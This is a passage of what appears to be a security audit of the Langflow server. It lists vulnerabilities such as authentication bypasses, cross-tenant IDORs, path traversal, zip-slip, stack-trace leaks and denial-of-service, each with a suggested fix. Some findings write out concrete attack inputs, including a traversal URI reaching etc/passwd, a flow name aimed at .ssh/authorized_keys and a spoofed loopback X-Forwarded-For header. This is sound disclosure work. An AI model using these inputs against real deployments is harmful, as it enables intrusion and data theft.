Attacker: an unauthenticated network caller, crossing into the superuser account because the operator's intended secret is silently discarded.
Path: an operator sets LANGFLOW_SUPERUSER_PASSWORD to a strong value but leaves AUTO_LOGIN at its default True. In this validator, because info.data.get("AUTO_LOGIN") is truthy, any value != DEFAULT_SUPERUSER_PASSWORD is overwritten back to "langflow" (line 76). setup_superuser then reads settings_service.auth_settings.SUPERUSER_PASSWORD (services/utils.py:87) and creates the superuser with the default; reset_credentials() at services/utils.py:102 also rewrites it to the default. The config-file load path (services/settings/manager.py:46-48) constructs AuthSettings with only CONFIG_DIR, so a password set there cannot survive either.
Why nothing stops it: the validator runs on assignment/validation before any consumer reads the field, so the operator's configured strong password never reaches create_super_user; the override is unconditional whenever AUTO_LOGIN is true, which is the default.
Impact: a deployment that explicitly configured a strong superuser password still ends up with the well-known "langflow" credential, and the public /api/v1/login route accepts it, handing the attacker superuser access.
Fix: never overwrite an explicitly provided SUPERUSER_PASSWORD. Only fall back to the default when the value is empty, and log a warning requiring the operator to set a password instead of silently replacing it.

findings.title: Short SECRET_KEY lets attacker regenerate Fernet key and decrypt stored secrets
findings.description:
Entry: SECRET_KEY setting (services/settings/auth.py:17) reaching get_fernet/encrypt_api_key (services/auth/utils.py:440-450) via variable storage (services/variable/service.py:119,138) and API-key storage (api/v1/api_key.py:70).
Attacker: anyone who obtains a copy of the database or a stored ciphertext and knows the short SECRET_KEY, crossing the confidentiality boundary of stored secrets.
Path: when SECRET_KEY is shorter than MINIMUM_KEY_LENGTH (32), ensure_valid_key seeds Python's Mersenne-Twister PRNG with the secret and derives the 32-byte Fernet key from random.getrandbits (lines 431-433). That key protects every encrypted user variable and API key (encrypt_api_key/decrypt_api_key), so the encryption key is a deterministic, non-cryptographic function of the SECRET_KEY.
Why nothing stops it: there is no check that SECRET_KEY meets a length or entropy requirement, no error raised for a short key, and the code silently degrades to random.seed instead of failing; the derived key is reproducible byte-for-byte from the seed, so it adds no work factor for an attacker and is not cryptographically strong.
Impact: with a short SECRET_KEY, an attacker who reads the encrypted column can regenerate the Fernet key and decrypt every stored provider API key and global variable, and can also forge encrypted values.
Fix: reject SECRET_KEY values shorter than 32 bytes at startup, and derive the Fernet key with a proper KDF (e.g. HKDF/bcrypt-pbkdf) instead of random.seed; never use the random module for key material.

findings.title: Unauthenticated stack trace exposure via public flow build errors
findings.description: Entry: src/backend/base/langflow/api/v1/chat.py:561 (POST /api/v1/build_public_tmp/{flow_id}/flow, unauthenticated) -> start_flow_build (api/build.py:41) -> generate_flow_events (api/build.py:181) -> _build_vertex (api/build.py:287). Attacker: an unauthenticated visitor, crossing the boundary from anonymous internet caller to server-internal diagnostics. generate_flow_events wraps graph.build_vertex (which evaluates user-supplied component code through langflow.custom.eval/validate.create_class) in `except Exception`, sets tb = traceback.format_exc() and message = {"errorMessage": params, "stackTrace": tb}, puts it in OutputValue(message=message) inside ResultDataResponse.outputs, and the response is emitted as events on the job queue; the caller polls GET /api/v1/build/{job_id}/events or streams it (api/v1/chat.py:203-222, api/build.py:96-131) and reads the full stack trace. Nothing on the path stops it: build_public_tmp only calls verify_public_flow_and_get_user, which requires nothing more than a client_id cookie and flow.access_type == PUBLIC (api/utils.py:350-361) and then builds with the flow owner's user id (api/v1/chat.py:611-623); get_build_events/get_flow_events_response carry no authentication dependency at all (api/v1/chat.py:210-222). Impact: an anonymous visitor to any public flow obtains absolute server filesystem paths, internal module/framework versions, stack frames and configuration details embedded in the traceback, which is reconnaissance for further attacks against the host and helps fingerprint the deployment. Fix: never place traceback.format_exc() in the client-facing payload - log it server-side with logger.exception and return only the formatted exception message (format_exception_message) or a generic "Error building Component" string, and add an authentication/ownership check to the /build/{job_id}/events route.

findings.title: Access token can be redeemed as a refresh token for 7-day persistent access
findings.description:
Entry: src/backend/base/langflow/api/v1/login.py:134 (POST /api/v1/refresh reads the refresh_token_lf cookie and passes it straight to create_refresh_token).
Attacker: A party who holds any validly-signed token that is NOT a refresh token (e.g. a short-lived access token leaked from the non-HttpOnly access_token_lf cookie, from browser storage, logs, or a proxy), crossing the token-purpose boundary from "access" to "refresh".
Path: login.py:131 token = request.cookies.get("refresh_token_lf") -> login.py:134 create_refresh_token(token, db) -> utils.py:381 jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM]) -> utils.py:387 token_type = payload.get("type") -> utils.py:389 the guard `if user_id is None or token_type == ""`. Because access tokens are minted with type "access" (utils.py:353) and API-key tokens with type "api_key" (utils.py:333), neither equals the empty string, so the guard passes -> utils.py:397 create_user_tokens(user_id, db) issues a brand-new 7-day refresh token.
Why nothing stops it: the only checks are the JWT signature, a non-null sub, and `token_type == ""`; the code never asserts `token_type == "refresh"`. There is no per-token revocation list anywhere in the repo (grep for revoke/blacklist/jti/token_version finds nothing), so an already-leaked access token cannot be invalidated first.
Impact: an access token with a 1-hour lifetime (and the access cookie is non-HttpOnly by default, ACCESS_HTTPONLY=False in services/settings/auth.py:50) can be converted into a 7-day refresh token, and that refresh token is itself accepted as a bearer access token (see the get_current_user_by_jwt finding), giving the attacker persistent, renewable authenticated access to the victim's account long after the stolen token should have expired.
Fix: change the guard to reject anything that is not a refresh token, e.g. `if user_id is None or token_type != "refresh":`, and mint refresh tokens with an explicit distinct audience/type claim that the refresh endpoint strictly requires.

findings.title: Refresh token accepted as access token, defeating access-token expiry
findings.description:
Entry: src/backend/base/langflow/services/auth/utils.py:142 get_current_user (token read via Security(oauth2_login)) -> utils.py:149 get_current_user_by_jwt; this dependency backs get_current_active_user (utils.py:247) and get_current_active_superuser (utils.py:253) used by the API and by get_current_user_for_websocket (utils.py:227).
Attacker: A holder of a refresh token (7-day lifetime) or any other token signed with the app SECRET_KEY, crossing the boundary between "refresh" and "access" token purposes to obtain a full API session.
Path: the token is decoded at utils.py:182 with the correct signature check, then `user_id = payload.get("sub")` and `token_type = payload.get("type")` are read, and the only validation is `if user_id is None or token_type is None` (utils.py:195). The value of token_type is never compared to "access" (access tokens are created with type "access" at utils.py:353). The user is then loaded and returned as the authenticated principal.
Why nothing stops it: the signature and expiry are checked, but the token's purpose is not; there is no audience/issuer/type claim enforcement and no revocation list, so a refresh token — or any token minted by create_token — is accepted verbatim as an access token. Because create_refresh_token (utils.py:389) also wrongly accepts access tokens, the two defects chain into an indefinite token-refresh loop.
Impact: the 1-hour access-token lifetime is defeated; a stolen or replayed refresh token authenticates directly against every endpoint protected by get_current_active_user/get_current_active_superuser (including superuser-only routes), for its full 7-day life, and can be renewed at will.
Fix: after decoding, require the token purpose explicitly, e.g. reject unless `token_type == "access"` (raise 401 otherwise), and add a distinct audience claim per token class.

findings.title: Credential-free requests authenticate as superuser via AUTO_LOGIN fallback
findings.description:
Entry: src/backend/base/langflow/services/auth/utils.py:142 get_current_user -> utils.py:150 api_key_security(query_param, header_param); the same pattern exists at utils.py:103-106 for the websocket path (ws_api_key_security) and at utils.py:511-516 for get_current_user_mcp.
Attacker: An unauthenticated caller who reaches any endpoint guarded by get_current_user/get_current_active_user, crossing the authentication boundary into the superuser identity.
Path: when no OAuth2 token is present, get_current_user calls api_key_security with empty query/header params. In api_key_security, AUTO_LOGIN (default True, services/settings/auth.py:30) is true, SUPERUSER is set, and `not query_param and not header_param` is true, so the branch at utils.py:59 is taken; because skip_auth_auto_login also defaults to True (services/settings/auth.py:32), utils.py:60 loads the configured superuser by username and utils.py:62 returns it as the authenticated principal, with no credential of any kind.
Why nothing stops it: the only guards are the two boolean settings, both of which default to true in the shipped configuration, and there is no global authentication middleware in main.py (only CORS, content-size, MIME and query-flattening middleware). get_current_active_user (utils.py:247) then only checks is_active, which the superuser satisfies, and get_current_active_superuser (utils.py:253) checks is_superuser, which the auto-login superuser also satisfies.
Impact: on any deployment that does not explicitly set LANGFLOW_AUTO_LOGIN=false (or skip_auth_auto_login=false), every request with no credentials is silently authenticated as the instance superuser, exposing all users' data, flows, API keys and administrative actions.
Fix: remove the credential-free superuser fallback, or at minimum make skip_auth_auto_login default to False and gate it behind an explicit opt-in that is not enabled by the default AUTO_LOGIN, so an unauthenticated request can never resolve to a user.

findings.title: Authenticated user can plant flows in another user's account via user_id
findings.description:
Entry: src/backend/base/langflow/api/v1/flows.py:145 (POST /flows/ -> create_flow -> _new_flow at line 153).
Attacker: any authenticated user, crossing into another user's account namespace (tenant boundary).
Path: the request body is parsed into FlowCreate, which declares user_id: UUID | None = None (services/database/models/flow/model.py:221), and is passed unchanged to _new_flow. At line 72 the code only assigns the caller's id when flow.user_id is None; a body such as {"name":"x","user_id":"<victim-uuid>","data":{"nodes":[],"edges":[]}} keeps the supplied user_id, is validated into a Flow at line 122, and committed at line 154.
Nothing on the path stops it: there is no validator on FlowCreate.user_id, no re-assignment of user_id in create_flow (unlike create_flows at line 415 and upload_file at line 440 which both force current_user.id), and no DB constraint prevents a foreign user id.
Impact: the attacker plants flows inside another user's account. The victim sees and can open/execute them via read_flows (line 232 filters on their own id, so the injected rows show up), and flows carry arbitrary node data (custom Python components), so this is stored content/privilege injection into a victim's workspace; the attacker also inherits the victim's name/endpoint uniqueness collisions and can create PUBLIC flows attributed to the victim.
Fix: never trust user_id from the request - in create_flow set flow.user_id = current_user.id unconditionally (or exclude user_id from FlowCreate and assign it in _new_flow regardless of whether it was supplied).

findings.title: Upload flow writes attacker files into another user's project
findings.description:
Entry: src/backend/base/langflow/api/v1/flows.py:425 (POST /flows/upload/?folder_id=... -> upload_file).
Attacker: any authenticated user, crossing into another user's project/folder.
Path: the folder_id query parameter is taken directly (line 431) and assigned to each uploaded flow's folder_id at lines 441-442 before _new_flow persists them and the batch is committed at line 447.
Nothing on the path stops it: upload_file overwrites user_id from current_user.id but never checks that folder_id belongs to the caller; there is no lookup of the Folder row and no ownership predicate anywhere in the handler.
Impact: by supplying another user's project UUID, the attacker writes attacker-controlled flow files (arbitrary node data) into that victim's project, where they appear in the victim's project listing (projects.py:146).
Fix: before assigning, verify the folder belongs to current_user (select(Folder).where(Folder.id == folder_id, Folder.user_id == current_user.id)); reject with 404 if not found.

findings.title: Authenticated user writes attacker-controlled files to any path via fs_path
findings.description: Entry: src/backend/base/langflow/api/v1/flows.py:153 (POST /flows/ create_flow -> _new_flow) and src/backend/base/langflow/api/v1/flows.py:348 (PATCH /flows/{flow_id} update_flow). Attacker: any authenticated user, crossing the boundary from their own tenant data into the server's filesystem. The value enters as the fs_path field of FlowCreate (model.py:223) and FlowUpdate (model.py:271), both plain `fs_path: str | None = None` with no validator. In _new_flow the request body is passed straight to `await _verify_fs_path(flow.fs_path)` (line 69), which runs `await Path(path).touch()` (line 50), and after commit `_save_flow_to_fs(db_flow)` runs `async_open(flow.fs_path, "w")` then `f.write(flow.model_dump_json())` (lines 55-57). update_flow does the same at lines 348 and 363. Nothing on the path constrains the string: there is no validator on fs_path anywhere in the repo (grep for fs_path validator returns nothing), no check that it stays under a data directory, and anyio.Path/aiofile are ordinary filesystem calls, not a sandbox. The written content is attacker-controlled JSON (the flow model_dump_json), so this is an arbitrary-content arbitrary-path write: it can overwrite application config, startup hooks, cron files, or another user's files, and combined with traversal (`../../..`) can escape any intended folder, leading to code execution on the server. Fix: never accept a filesystem path from the request. Either drop fs_path from FlowCreate/FlowUpdate, or resolve it against a fixed base directory and reject any path that escapes it (e.g. `p = (base / fs_path).resolve(); if not p.is_relative_to(base.resolve()): raise`), and never touch/write before that containment check.

findings.title: Zip-slip: caller-controlled flow name used unsanitized as ZIP entry path
findings.description: Entry: src/backend/base/langflow/api/v1/flows.py:500 (POST /flows/download/) and src/backend/base/langflow/api/v1/flows.py:146 (POST /flows/ create_flow, where the name is set). Attacker: the flow owner who creates and then shares/downloads the archive, crossing into the file paths of whoever extracts it. The flow name is caller-controlled: FlowBase.name is `str = Field(index=True)` (model.py:41) with no character validator, set from FlowCreate.name on POST /flows/. In download_multiple_file the name is interpolated into a ZIP entry name at line 525: `zip_file.writestr(f"{flow['name']}.json", flow_json)`. Python's zipfile.writestr does not sanitize the arcname, so a flow named `../../../../home/user/.ssh/authorized_keys` (or any traversal) produces an archive entry that, when extracted by a victim with a naive extractor (the default `ZipFile.extractall` and most GUI tools), writes outside the destination directory. Nothing on the path stops it: name validation only strips nothing (no regex on name), and the zip writer performs no normalization. Impact for this application: a user who distributes a downloaded flows archive can cause file write (zip-slip) on any machine that extracts it, potentially overwriting config or keys. Fix: sanitize the entry name before writestr, e.g. strip directory separators and traversal from flow['name'] (`safe = os.path.basename(flow['name']).replace('\\','_')` or a whitelist regex), and reject empty/`.`/`..` results.

findings.title: Authenticated user triggers full-table scan and memory spike via wildcard filename
findings.description:
Entry: src/backend/base/langflow/api/v2/files.py:81 (POST /api/v2/files, also line 82 POST /api/v2/files/)
Attacker: an authenticated user, crossing the per-tenant data/isolation boundary by forcing a server-wide table scan and in-memory materialization of every other tenant's File rows.
Path: the multipart filename reaches upload_user_file as file.filename; line 117 sets new_filename = file.filename, lines 118-121 strip the extension via new_filename.rsplit('.', 1), so a filename of '%.txt' yields root_filename = '%'. Line 131 then builds select(UserFile).where(col(UserFile.name).like(f'{root_filename}%')), i.e. LIKE '%%', and line 133 calls results.all(), loading every matching row.
Why nothing stops it: there is no validation of the filename characters and, critically, no UserFile.user_id filter in this statement (unlike get_file_by_name at line 180 and the batch queries at lines 265/297 which do filter by current_user.id). SQL LIKE treats '%' and '_' in the caller-controlled prefix as wildcards, so the pattern matches the whole File table across all users. Each matched row is deserialized into a Python object and kept in the list before the loop at line 139 runs.
Impact: a single small authenticated upload request (a few hundred bytes) triggers a full-table scan and holds every File row of every tenant in memory; on a busy instance this is a cheap, repeatable way to spike memory and DB CPU and slow or OOM the shared server process for all users.
Fix: escape LIKE metacharacters in root_filename (or use a literal equality/prefix match that cannot be widened by '%'/'_') and add .where(UserFile.user_id == current_user.id) to the statement so the query is scoped to the caller's own files.

findings.title: Authenticated user can OOM the shared worker by zipping all their files in memory
findings.description:
Entry: src/backend/base/langflow/api/v2/files.py:287 (POST /api/v2/files/batch/)
Attacker: an authenticated user, crossing the shared-process resource boundary by making one tiny request allocate memory proportional to all of their stored files at once.
Path: the request body is parsed into file_ids: list[uuid.UUID] (line 289); line 297 selects the caller's files whose ids are in that list; lines 305-308 create io.BytesIO() and zipfile.ZipFile(zip_stream, 'w'); the loop at lines 309-321 calls storage_service.get_file(...) for each file, which reads the entire file into memory (LocalStorageService.get_file line 64-68 does a single f.read(), S3 likewise), and zip_file.writestr appends it to the in-memory BytesIO.
Why nothing stops it: there is no limit on the number of file_ids, no limit on the total uncompressed size of the archive, and the ZIP is fully buffered in RAM before being handed to StreamingResponse at line 330, so the response is not streamed from disk. The ContentSizeLimitMiddleware only caps the request body (the list of ~36-byte UUIDs), not the memory the handler allocates; each referenced file can be up to max_file_size_upload (default 100MB) with no cap on how many the caller has.
Impact: a request body of a few kilobytes can make the server hold the sum of all the caller's file contents plus the compressed archive in memory simultaneously; a user with many large uploads can OOM the shared worker with a single POST, denying service to every other user.
Fix: stream the archive instead of buffering it (write to a temporary file or a spooled/generator-backed ZIP), and enforce an upper bound on the number of files and on the total uncompressed size returned per request, rejecting the request once the cap is exceeded.

findings.title: Authenticated user can delete any other user's API key by ID
findings.description: Entry: src/backend/base/langflow/api/v1/api_key.py:44 (DELETE /api/v1/api_key/{api_key_id}). Attacker: any authenticated user of the deployment, crossing the boundary into another user's account credentials. The path: the caller supplies api_key_id as a path parameter; delete_api_key_route passes it straight to delete_api_key(db, api_key_id); that function runs session.get(ApiKey, api_key_id) and deletes the row. The only guard on the route is Depends(auth_utils.get_current_active_user), which proves the caller is a logged-in active user but says nothing about which user owns the key; there is no ApiKey.user_id == current_user.id predicate anywhere on the path, and the route does not even receive the current_user object to compare against. The test test_delete_api_key_route only deletes the caller's own key, so it never exercises the missing ownership check. Impact: an attacker can enumerate/guess UUIDs and delete other users' API keys, revoking their programmatic access (and the keys used to reach /store and other API-key-authenticated endpoints) — a denial of access / credential-destruction primitive across tenants of the same instance. Fix: fetch the key scoped to the owner, e.g. query select(ApiKey).where(ApiKey.id == api_key_id, ApiKey.user_id == current_user.id) and 404 if no row matches, or compare api_key.user_id to current_user.id before deleting; pass current_user into the route and the CRUD call.

findings.title: Unauthenticated attacker sets unbounded `limit` on GET /store/components/, exhausting server memory
findings.description: Entry: src/backend/base/langflow/api/v1/store.py:102 (`limit: int = 10` on GET /store/components/). Attacker: an unauthenticated caller of the public API, crossing the boundary of how much server work one small request may cause. The value flows from store.py:117 into StoreService.get_list_component_response_model (services/store/service.py:543), then into query_components, which writes it straight into the outbound Directus request as params["limit"] = limit (services/store/service.py:274-275). Nothing on the path stops it: the route has no auth dependency (it uses get_optional_user_store_api_key, so anonymous callers are allowed), the parameter has no le=/ge= or Query constraint, the service performs no min()/max() clamp (grep shows limit is only assigned and passed through), and the repository contains no rate limiter. The request is a few bytes but forces the server to fetch, pydantic-parse (ListComponentResponse at service.py:298, including data/metadata/tags fields) and JSON-serialize up to `limit` full component records; the len(result) >= limit branch at service.py:563 only adds a count query and does not cap the rows. Impact: a single anonymous request such as /api/v1/store/components/?limit=100000000 makes the Langflow server pull a huge result set from the store backend into memory and serialize it, exhausting memory/CPU and denying service to other users. Fix: bound the parameter, e.g. `limit: Annotated[int, Query(ge=1, le=100)] = 10` and `page: Annotated[int, Query(ge=1)] = 1`, and defensively clamp limit inside query_components before building params.

findings.title: Unauthenticated caller reads internal error details via public flow build route
findings.description:
Entry: src/backend/base/langflow/api/v1/chat.py:561 (/api/v1/build_public_tmp/{flow_id}/flow), reached with any client_id cookie.
Attacker: an unauthenticated caller, crossing the boundary into internal server error details produced under the flow owner's identity.
The path: build_public_tmp calls start_flow_build with current_user=owner_user (chat.py:611-626); generate_flow_events in build.py runs _build_vertex, and when a vertex build fails the outer except at build.py:383-395 calls `message = parse_exception(exc)` (line 394), which is utils.py:259-263 and returns `str(exc)` for any exception without a `.body` attribute; that message is raised as HTTPException(status_code=500, detail=message) at build.py:395.
Nothing on the path stops it: parse_exception has no sanitization, the public route performs no authentication beyond the presence of a client_id cookie, and the exception text is passed straight into the HTTP detail.
Impact for this application: an anonymous caller learns internal exception messages from the server's build/DB layer, which frequently embed the failing SQL statement with bound parameters (flow data, credential values) and library-level error text, exposing the flow owner's configuration and secrets to an unauthenticated party.
Fix: replace `return str(exc)` with a fixed, non-revealing message for anything returned to the client, and reserve the detailed exception for server-side logging; only surface curated messages for known user-caused errors.

findings.title: Unauthenticated build failures leak full Python stack traces
findings.description:
Entry: src/backend/base/langflow/api/v1/chat.py:561 (/api/v1/build_public_tmp/{flow_id}/flow) and build.py:443-447, which construct ErrorMessage from a caught exception and push it into the event stream via event_manager.on_error.
Attacker: an unauthenticated caller with a client_id cookie, crossing the boundary into server-side stack traces and file paths.
The path: build.py:441-448 wraps build_graph_and_get_order in try/except and, on any exception, builds ErrorMessage(flow_id=flow_id, exception=e); ErrorMessage.__init__ (schema/message.py:421-473) sets the error content block's `traceback` to `traceback.format_exc()` at line 467 and the reason to the exception's args at lines 392-393/409-410; the event is emitted to the queue consumed by the caller at build.py:156-163 and returned as the NDJSON response.
Nothing on the path stops it: the traceback is embedded unconditionally, with no sanitization, and the public build route performs no authentication beyond the presence of a client_id cookie, so any anonymous caller who can cause a build failure receives the full Python stack trace.
Impact for this application: stack traces disclose absolute file paths, module structure, library versions and, in the message portion, internal query/connection details and possibly the flow owner's secret values, giving an unauthenticated attacker a map of the server for follow-up attacks.
Fix: do not include traceback.format_exc() (or raw exception args) in error events returned to clients; log the traceback server-side and send only a stable error code and a generic, user-safe reason in the event payload.

findings.title: Any authenticated user can read other users' flow files via MCP resources/read
findings.description:
Entry: src/backend/base/langflow/api/v1/mcp_projects.py:134 (GET /api/v1/mcp/project/{project_id}/sse) -> MCP resources/read -> handle_read_resource at line 736.
Attacker: any authenticated user (a valid JWT/API key, or the AUTO_LOGIN superuser fallback) who owns or can create one project, crossing into another user's flow files.
Path: the SSE handler only verifies that the caller owns {project_id} (lines 142-148) and then runs the shared ProjectMCPServer for that project. The MCP client sends a resources/read request whose URI is entirely attacker-controlled; handle_read_resource parses it (lines 741-754) and takes flow_id = path_parts[-2], then calls storage_service.get_file(flow_id=flow_id, file_name=filename) at line 759. Nothing checks that flow_id belongs to current_user or to project_id; the handler never even reads current_user_ctx. local.get_file (services/storage/local.py:45-68) just does data_dir / flow_id / file_name and returns the bytes, which are base64-encoded and returned to the caller (line 767).
Why nothing stops it: the only authorization on this path is the Folder.user_id == current_user.id check on the SSE route, which gates which project's server you connect to, not which flow you read. The flow_id used for the actual file read comes straight from the request URI and is not compared against the project or the user anywhere.
Impact: any authenticated user can read files stored under any other user's flows (uploaded datasets, exported data, any secret written to flow storage) by connecting to their own project's MCP endpoint and issuing a read_resource with the victim's flow id.
Fix: in handle_read_resource, resolve the flow by id and assert it is in the caller's project (e.g. select(Flow).where(Flow.id == flow_id, Flow.folder_id == current_project_ctx.get()) or Flow.user_id == current_user_ctx.get().id) before calling get_file, and return not-found otherwise.

findings.title: Authenticated user reads arbitrary server files via MCP resource URI
findings.description:
Entry: src/backend/base/langflow/api/v1/mcp_projects.py:134 (GET /api/v1/mcp/project/{project_id}/sse) -> MCP resources/read -> handle_read_resource at line 736.
Attacker: any authenticated user crossing out of the per-flow storage directory into arbitrary files on the server host.
Path: the request URI is attacker-controlled; line 743 splits parsed_uri.path on '/', line 754 sets filename = unquote(path_parts[-1]) (so %2f decodes to '/', and %2e%2e%2f to '../'), and line 759 passes that filename to storage_service.get_file. local.get_file (services/storage/local.py:58) computes file_path = self.data_dir / flow_id / file_name with no sanitization or containment check.
Why nothing stops it: no UUID validation, no basename/normalization, no check that the resolved path stays inside data_dir. unquote runs after the split, so encoded separators survive the last-segment extraction and are then interpreted by the filesystem.
Impact: arbitrary file read as the server process (e.g. a URI ending in ..%2f..%2f..%2fetc%2fpasswd), with the bytes returned base64-encoded to the caller over the MCP response.
Fix: reject filenames containing '/', '\\' or '..', take only Path(filename).name, and verify the resolved path is within data_dir (os.path.realpath containment) before reading; validate flow_id as a UUID.

findings.title: Authenticated user enumerates every flow and stored file name across tenants
findings.description:
Entry: src/backend/base/langflow/api/v1/mcp_projects.py:134 (GET /api/v1/mcp/project/{project_id}/sse) -> MCP resources/list -> handle_list_resources at line 696.
Attacker: any authenticated user crossing into the inventory of every other user's flows.
Path: the SSE route checks only that the caller owns {project_id} (lines 142-148), then runs the project's MCP server. handle_list_resources executes select(Flow) at line 710 with no user_id or folder_id filter and, for every flow in the whole database, calls storage_service.list_files(flow_id=str(flow.id)) (line 715) and returns a resource entry containing the flow id, flow name and each file name (lines 719-725).
Why nothing stops it: the handler ignores current_user_ctx and current_project_ctx entirely; there is no predicate restricting the query to the project the connection is scoped to.
Impact: an authenticated user enumerates all flow ids, flow names and stored file names across every tenant/user in the deployment, which also supplies the flow ids needed for the read_resource IDOR above.
Fix: scope the query to the current project/user, e.g. select(Flow).where(Flow.folder_id == current_project_ctx.get(), Flow.user_id == current_user_ctx.get().id).

findings.title: Spoofed X-Forwarded-For header bypasses local-only check on MCP config install
findings.description:
Entry: src/backend/base/langflow/api/v1/mcp_projects.py:322 (POST /api/v1/mcp/project/{project_id}/install) -> get_client_ip at line 299.
Attacker: a remote authenticated user crossing the "local connection only" boundary the endpoint is supposed to enforce.
Path: get_client_ip (lines 299-319) returns the first value of the X-Forwarded-For request header if present (line 309-312), and is_local_ip (lines 271-296) only checks that the string is loopback. The result gates the whole handler at lines 331-333. An attacker sends 'X-Forwarded-For: 127.0.0.1' (or '::1') and passes the check from any remote address, after which the handler writes/merges MCP server config into Path.home()/... on the server (lines 407-488).
Why nothing stops it: the header is fully client-controlled and no trusted-proxy list is consulted; request.client.host (the actual peer) is only used when the header is absent.
Impact: the local-only restriction on installing MCP configuration is bypassed, letting a remote user cause the server to create and modify files in the server account's home directory (e.g. ~/.cursor/mcp.json, ~/.codeium/windsurf/mcp_config.json, the Claude desktop config), and to probe which config paths exist.
Fix: do not trust X-Forwarded-For for this decision; base the loopback check on request.client.host (or only honor the header when the direct peer is a configured trusted proxy).

findings.title: Authenticated user can execute any other tenant's flow via unscoped UUID lookup
findings.description:
Entry: src/backend/base/langflow/api/v1/endpoints.py:273 (POST /run/{flow_id_or_name}, flow=Depends(get_flow_by_id_or_endpoint_name)).
Attacker: an authenticated API-key user, crossing the tenant/owner boundary to read and execute another user's private flow.
Path: the caller sends any valid flow UUID in the path; get_flow_by_id_or_endpoint_name parses it with UUID(flow_id_or_name) at line 282 and executes session.get(Flow, flow_id) at line 283, which fetches the row by primary key alone. The user_id filter is applied only in the ValueError/endpoint_name branch (lines 287-289), so the UUID branch never scopes the lookup. The returned FlowRead flows back to simplified_run_flow, which passes it to simple_run_flow (endpoints.py:340) and runs the graph with the victim's stored flow data (credentials, prompts, connected tools).
Why nothing stops it: api_key_security (services/auth/utils.py:43) only authenticates the caller and returns their UserRead; neither the dependency nor simplified_run_flow compares flow.user_id to api_key_user.id. The contrast with experimental_run_flow (endpoints.py:547), which does `select(Flow).where(Flow.id == flow_id).where(Flow.user_id == api_key_user.id)`, confirms the ownership check was simply omitted on this route.
Impact: any authenticated user who learns or guesses another tenant's flow UUID can execute that flow, consuming the owner's configured credentials/API keys and extracting its outputs and internal configuration — full cross-user IDOR on flow execution.
Fix: in get_flow_by_id_or_endpoint_name, require and always apply the user scope, e.g. `stmt = select(Flow).where(Flow.id == flow_id)` and, when user_id is provided, `.where(Flow.user_id == uuid_user_id)`, then call .first() and 404 when no row matches; or make the /run route load the flow with the same `Flow.user_id == api_key_user.id` filter used by experimental_run_flow. Do not leave the by-ID branch unscoped.

findings.title: Authenticated user can steal other users' flows via project creation IDs
findings.description:
Entry: src/backend/base/langflow/api/v1/projects.py:39 (@router.post("/projects/")) -> create_project, body FolderCreate.components_list / flows_list.
Attacker: an authenticated low-privileged user crossing into another user's flows, by supplying the victim's flow UUIDs in their own project-creation body.
Path: project.components_list (line 77) and project.flows_list (line 84) are caller-controlled lists of UUIDs; they are used verbatim in update(Flow).where(Flow.id.in_(project.components_list)).values(folder_id=new_project.id) (line 79) and the same for flows_list (line 86).
Why nothing stops it: the only prior check (lines 54-71) is a name-uniqueness check scoped to the caller; there is no Flow.user_id == current_user.id filter on either UPDATE, and no validation that the supplied flow ids belong to the caller. GET /projects/{project_id} (line 146) then returns select(Flow).where(Flow.folder_id == project_id) with no user filter, so the attacker can immediately read the flows they just moved in.
Impact: any authenticated user can move arbitrary other users' flows (including components) into a project they own and then read/modify/download them, i.e. full cross-tenant read/write of flow data.
Fix: add .where(Flow.user_id == current_user.id) to both UPDATE statements (or verify each id with a SELECT scoped to current_user.id before updating) and reject ids not owned by the caller.

findings.title: Authenticated user can move own flows into another tenant's Starter Project folder
findings.description:
Entry: src/backend/base/langflow/api/v1/projects.py:174 (PATCH /projects/{project_id})
Attacker: an authenticated user, crossing the tenant boundary by writing flows into another user's folder.
The handler looks up the fallback folder with select(Folder).where(Folder.name == DEFAULT_FOLDER_NAME)).first() (line 214) - DEFAULT_FOLDER_NAME is the per-user "Starter Project" folder (created per user in initial_setup/setup.py:1043 with user_id), yet this query filters by name only and takes the first matching row across all users, with no Folder.user_id == current_user.id. It then moves the project's excluded flows (line 217) into that folder. Every other lookup of this folder in the codebase filters by user_id (flows.py:128, folder/utils.py:41). Because the row is chosen globally, the flows are moved into whichever user's "Starter Project" happens to be returned first. Impact: the caller's private flows (including their data/secrets) are injected into a different user's project, and the caller's flows silently disappear - a cross-tenant data movement and disclosure. Fix: filter the lookup by the current user: select(Folder).where(Folder.name == DEFAULT_FOLDER_NAME, Folder.user_id == current_user.id).

findings.title: Project deletion cascades into other users' flows in the folder
findings.description:
Entry: src/backend/base/langflow/api/v1/projects.py:235 (DELETE /projects/{project_id})
Attacker: an authenticated user, crossing the tenant boundary by destroying another user's flows.
The handler deletes only the flows it explicitly cascades (lines 243-248, filtered by Flow.user_id == current_user.id), but then calls await session.delete(project) on the folder. Folder.flows is declared with cascade "all, delete, delete-orphan" (folder/model.py:27-29), so SQLAlchemy deletes every flow whose folder_id points at this folder regardless of Flow.user_id. Any flow owned by another user that sits in the caller's folder (reachable through the create_project/update_project hijack) is permanently destroyed along with its messages, transactions and vertex builds. Impact: cross-tenant destruction of another user's flows. Fix: before deleting the folder, reassign or refuse to delete foreign-owned flows in the folder (or scope deletion to flows owned by the caller and set the rest to folder_id NULL).

findings.title: Authenticated user can download other users' flows via project download
findings.description:
Entry: src/backend/base/langflow/api/v1/projects.py:267 (@router.get("/download/{project_id}")) -> download_file.
Attacker: an authenticated low-privilege user, crossing into another user's flow data.
Path: project_id is used at line 283 in select(Flow).where(Flow.folder_id == project_id), and every returned flow is serialized (minus only api-key template values, via remove_api_keys) into a zip at lines 290-296 and streamed back to the caller.
Nothing on the path stops it: the project lookup at line 276 does check Folder.user_id == current_user.id, but the flows query has no Flow.user_id filter. Because update_project/create_project let a caller move a foreign flow into their own folder, a flow that belongs to another user can be placed in this folder and will be included in the download. read_project (line 169) defends against exactly this by filtering flow.user_id, but download_file does not.
Impact: exfiltration of another user's flow definitions, prompts and node configuration (only api-key/password fields are stripped) through the attacker's own project download.
Fix: add .where(Flow.user_id == current_user.id) to the flows query (or filter the serialized list by flow.user_id == current_user.id before writing the zip).

findings.title: Unauthenticated SSRF via scraped search-result URL fetch to internal hosts
findings.description:
Entry: src/backend/base/langflow/components/data/web_search.py:95 (requests.get(final_url, ...)), reached from perform_search, whose output is exposed as a tool via the tool_mode=True query input.
Attacker: an outsider who is not a Langflow user (a web-content author who can rank a page for a search query the flow uses, or anyone who can influence DuckDuckGo results), crossing the boundary into the Langflow server's internal network.
